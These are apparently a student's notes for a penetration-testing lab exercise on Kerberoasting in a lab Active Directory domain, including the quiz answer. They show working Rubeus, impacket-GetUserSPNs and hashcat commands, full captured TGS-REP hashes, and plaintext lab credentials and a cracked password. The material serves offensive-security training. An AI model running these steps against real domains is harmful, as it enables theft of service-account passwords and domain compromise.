Topics: Kerberoasting
Questions
Follow the steps outlined in this section to obtain the plaintext password of iis_service on Windows and Kali by performing Kerberoasting. What is the correct Hashcat mode to crack TGS-REP hashes?
# Answer
13100

# We know that when a user wants to access a resource hosted by a Service Principal Name (SPN), the client requests a service ticket that is generated by the domain controller. The service ticket is then decrypted and validated by the application server, since it is encrypted via the password hash of the SPN.

# When requesting the service ticket from the domain controller, no checks are performed to confirm whether the user has any permissions to access the service hosted by the SPN.

# These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller.

# he service ticket is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account. This technique is known as Kerberoasting

# To perform Kerberoasting, we'll use Rubeus again. We specify the kerberoast command to launch this attack technique. In addition, we'll provide hashes.kerberoast as an argument for /outfile to store the resulting TGS-REP hash in. Since we'll execute Rubeus as an authenticated domain user, the tool will identify all SPNs linked with a domain user.

xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.214.75

.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
...
[*] Total kerberoastable users : 1
[*] SamAccountName         : iis_service
...
$krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$428E5D8DFCE9C0CCCB4A6AE9E1CEEC13$7AB8A2135FF1F5971712316E67F85CDE0B6107F9A2A462BD735189D92BBC7C99889D3E95D006A4D4CC17D803CB7F56AE4E859D996A95A506B646D6475B93E4A18A9F5EA14B948D61DF42681BFED9CEDC86D045D5633EE0BBE3746A7F1B0787580E0515F69D08DA87479B79C8B4A9AEE4A5780B0D9E28A95654995058C7FCD1D5B358FA072E30201178583DA692271B77C551E78FE967FD7B0377F6D4EFAC47A615687A8FA7C249DF5C05B2D5A36D04D5D17D36BBFD758769918877C499E70114FFE4EB5A016C53C1BB576636A5FCFB6A05E8D20DF66242B76588D52907E081855AA63C773480FBE81E22A33123C2E95AA6BC6ED817836391540D0B61CC9F055B738D6CB1D8DF8998663F5D3C0F9DAEFA4B58520B765E30870ECCDD1F3187B11A6D790894D66AD1E553051084F1FBDF25CD2D7096FC8A230057BEDC25BAEB7FA3B7CD8A03D744FAA3106E64322C11E16E110D4381BFE86E51790091B437CCB3984C8C8C0802ADBB49B49D0B9985D0FA03E640A402DBE1A7FC7BE9A039343A1000A46E25C78DB181A69F65E2AB26E30F86924A1FC6BE2F6F16B484DEB4452A89981CE2DD718E1453E2C79B31115631E3DBF6225A5BD5484B93A9AFB10B8FD6D721C71E1C29A47E9545E4FB1CA3091BD73BEB2155341FE303F80D027F3AE07AC38EDDD7960A1DF8F1C0C7C96FDF9966DA438F79D14B64D7DCBDDB881D7329A087E47D1E1CC3B9D4775C6525EA6A4F56F868CD409EA791EF670A51D761423F38C4DDFF53A4C69AEC571B3970BD27F23A6CB7CF41ED106F130BEC14869C433C53A8E3583F23399558C32CDD137615EF43B32E02DFBF39D3C4D62CD450A5BB7D9FB1A8672EB72F729A26804E3647842D59506616A62B2505B38C3E997FB80F0DA9A00A3D7EF495923E72B74F9E189D4D3DEC112CC47F47203E8A86C596AC273BC6977ED5A9A9411D36D47998C080017463F4BE1C12EC64559CF1AE64FC6C584E048D1A935C095F75B7B599E60EF932AFDC51037F5C72D1F3A4BD8ACB4BCE5C2964B54DAD6B55D8BF8F3EE2C02DD6AD953177AA9D9A87E9A38B6A095CD388F2C17C30A73D64D34D5C257D430A875D3361E7E7D3A563A8647E506E3CAAD64417C59E654CE2BCE053E7218A1E5AE1814432F0508EF96C4E3718C159C762ED591EB19C95D088FF5B7D9ED611E9AE85768C013E80B4D38E0294E2427F4F144B4313EA978BD56A9CF24D87FBF046DD97FC650782CE6D42FC29B2452750254534D592BB1BDF9B528892CCF2953BF84FF0808925400C57A17A57A01AA3650B09DE9A038CAC9F3D84A7CCD09AAD7014699F2764D72A4273D3B2187C1D365BCE284DADA9A399E0BF9F599BE1846D6B59958EB27FABC3230661FFEFB9B522D7A094E173C9A72312A4FD98D53F99019BB8A8B51DA753435248E74B2F0A1A856856C2A71D1E03399CDA8DD96C67F2A453DA97176EC9BA7F3640D308D264B8E0DA

# Now, let's copy hashes.kerberoast to our Kali machine. We can then review the Hashcat help for the correct mode to crack a TGS-REP hash.

hashcat --help | grep -i "Kerberos"
...
13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
...

sudo hashcat -m 13100 hash.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
...
Strawberry1                                                  
Session..........: hashcat
Status...........: Cracked
...

# Great! We successfully retrieved the plaintext password of the user iis_service by performing Kerberoasting.

# Methods 2 #

# Let's perform Kerberoasting from Linux. We can use impacket-GetUserSPNs2 with the IP of the domain controller as the argument for -dc-ip. Since our Kali machine is not joined to the domain, we also have to provide domain user credentials to obtain the TGS-REP hash. As before, we can use -request to obtain the TGS and output them in a compatible format for Hashcat.
sudo impacket-GetUserSPNs -request -dc-ip 192.168.214.70 corp.com/pete
Password: Nexus123!
...
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$68140e0ff0599845cacfa860ae22da00$3da75e4a7dcd6a33d61da1762b1d62f6f39e4c6e6e9cb89cfe301b42f7b64d13ba7c6cbe700916dc871c58d6c44b7c7007e3e2f28546e30ffe8c157bda8f58048e4e8539f43de84d51b92eb5b6828c0979b295f26964db0b4d0d23e596ca3f262bba855d1cf607060a4b8035ee66ff86a796e90ff5afb3956ef43d7545f92fcbf3ca15359b842fdd03425283c088afe6eeefe2abc1f71b723654da79dfbca310451008eaea6400d1598b04dc6a1371fd145fd486789603654ec06a932bb6a88eb8fa8f9ba3fb6893cba31fc606e37e31acc36548be54f2923911be14eb30c527e7225c38236013efea89690b1454bd4627e8bff94cdf8a15ec55a1edc7c9b95c85cd70cc8bd1fc30e41ec3c9a041b787cc0dedf56f51ee3c95cc4be2025d353c5a2859983a43eadaee752bd79425e551806560713ca289493745464dbbd96673587db6d3d05ad66a48a70d416af940f711d948ce8fc31e1e6eb282c9b250bbb54d4fcda6296574111a291fcdfec884883b017c3a899d77a0b5b3c1b09bdd1968972e7fe016fc356e532612000d952935d8f7407fcb526b40ccf34fa4f816422cac5b68e53561ae7cd3e07aef8fdb0dd685f0a6612085f3c3fca67ef6ad927d1f1a855da98dc70c6315f2acdd0e9913ea79f5a26b15f9c1ca5bc725ba6e450fb43f2a61cf0db546e36aa6a5853b76a2bd3c1d086ccaf4932219e5b58454a96a7c147c6bb59f13131c1ecee37b7dfaa6bf6f9e39eeb7fc17591c6467f125865822d17994a932379942c3f8176ffb68a5f90ac2b803201a009abdfa3f491c722eef330fb165ca4e43b136a79563bd765163b1fbc27dc94a421bf20e1566e93557642ba7d880360500ff5c8c8d7de8bb73521bacf41513731aa8145b2dc658b76755941191f43b6249cdc02924d2d17155ea1fc4bdfe05d46ea58c4969764e55f6d154d8eeeba418ba3d6a14ea4a83b7a4436ece877553e59373f7b30a54b1d9f0e28075a8b3728e31322fb95fe496bfa353994d58b999826d1f40724a4e11167c608c5cf16b9e194475101219b0f6e7ecf7c0f8791920f01e1919e054af126c51b140f0d9f39039214bdbea73d7dc9b27a100f36c77b34f080b18e85b96987afe098746f28e82658eba910109a706448deca6e97d9821cd2be3360f205e913035754e876fcb44e173dc4d029ab3e42f7c5df8cd98262373f4fe9a8bfea55e466c60afddec1e7553c2fc0eb0299650caaf8de11696e63cd25e4b527405ca8040b4a5bbd3851b628efc3e4e8d32114d5cf5f1b4c42fcef9b2e9bbb5bb09c8f713aa2069e1d34c797a876b98d9346c1a93aca34264bcd19a0e57eca657579ee0
...
sudo hashcat -m 13100 hash.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

# We could successfully crack the TGS-REP hash again, providing the same plaintext password as before.

# This technique is immensely powerful if the domain contains high-privilege service accounts with weak passwords, which is not uncommon in many organizations. However, if the SPN runs in the context of a computer account, a managed service account,5 or a group-managed service account,6 the password will be randomly generated, complex, and 120 characters long, making cracking infeasible. The same is true for the krbtgt user account which acts as service account for the KDC. Therefore, our chances of performing a successful Kerberoast attack against SPNs running in the context of user accounts is much higher.

# Let's assume that we are performing an assessment and notice that we have GenericWrite or GenericAll permissions7 on another AD user account. As stated before, we could reset the user's password but this may raise suspicion. However, we could also set an SPN for the user,8 kerberoast the account, and crack the password hash in an attack named targeted Kerberoasting. We'll note that in an assessment, we should delete the SPN once we've obtained the hash to avoid adding any potential vulnerabilities to the client's infrastructure.








